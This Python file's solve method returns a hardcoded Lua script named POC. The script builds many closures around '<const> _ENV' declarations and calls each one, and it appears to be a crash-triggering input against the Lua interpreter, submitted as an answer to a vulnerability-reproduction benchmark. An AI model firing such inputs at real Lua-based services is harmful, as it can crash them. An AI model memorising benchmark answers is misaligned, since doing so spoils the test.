import os


POC = b"""local holders = {}

local function factory_simple()
  local _ENV <const> = { a = 1, b = 2 }
  local function inner()
    return a + b
  end
  return inner
end
holders[#holders + 1] = factory_simple()

local function case1()
  local _ENV <const> = { x = 10 }
  local function f()
    return x
  end
  return f
end
holders[#holders + 1] = case1()

local function case2()
  local outer = 20
  do
    local _ENV <const> = { y = 30 }
    local function f()
      return y + outer
    end
    return f
  end
end
holders[#holders + 1] = case2()

local function case3()
  local _ENV <const> = { z = 40 }
  local r = {}
  for i = 1, 3 do
    r[i] = function()
      return z + i
    end
  end
  return r
end
do
  local t = case3()
  holders[#holders + 1] = t[1]
  holders[#holders + 1] = t[2]
  holders[#holders + 1] = t[3]
end

local function case4()
  local _ENV <const> = { w = 50 }
  local x <close> = setmetatable({}, { __close = function() end })
  local function f()
    return w, x
  end
  return f
end
holders[#holders + 1] = case4()

local function case5(...)
  local _ENV <const> = { v = select(1, ...) or 60 }
  local function f()
    return v
  end
  return f
end
holders[#holders + 1] = case5(123)

local function case6()
  local _ENV <const> = { q = 70 }
  local function make()
    do
      local _ENV <const> = { q = 80 }
      local function g()
        return q
      end
      return g
    end
  end
  return make()
end
holders[#holders + 1] = case6()

local function case7()
  local _ENV <const> = { h = 90 }
  local function rec(n)
    if n > 0 then
      return rec(n - 1)
    else
      return h
    end
  end
  return function() return rec(2) end
end
holders[#holders + 1] = case7()

local function case8()
  local _ENV <const> = { err = error, pcall = pcall }
  local function f()
    local ok, msg = pcall(function() err("x") end)
    return ok, msg
  end
  return f
end
holders[#holders + 1] = case8()

for i = 1, #holders do
  local f = holders[i]
  f()
end
"""


class Solution:
    def solve(self, src_path: str) -> bytes:
        return POC
